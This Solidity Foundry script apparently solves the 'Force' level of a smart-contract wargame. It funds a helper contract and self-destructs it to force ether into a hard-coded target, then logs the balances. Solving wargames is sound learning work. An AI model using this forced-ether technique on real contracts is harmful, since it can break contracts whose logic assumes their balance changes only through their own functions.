// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Force} from "../src/Level8Force.sol";
import {Sender} from "../src/Level8ForceHelper.sol";
import {Script, console} from "forge-std/Script.sol";

contract Level8ForceSolv is Script {
    address _level8 = 0x80137cd4ee757Aa1DbEec7ADef47b6479d8f4BE5;

    function run() external {
        vm.startBroadcast();
        Sender sender = new Sender{value: 0.0005 ether}();
        console.log(address(sender), address(sender).balance);
        sender.destroyAndSend(payable(_level8));
        console.log(address(this));
        console.log(address(sender), address(sender).balance);

        console.log(address(_level8), _level8.balance);
        vm.stopBroadcast();
    }
}
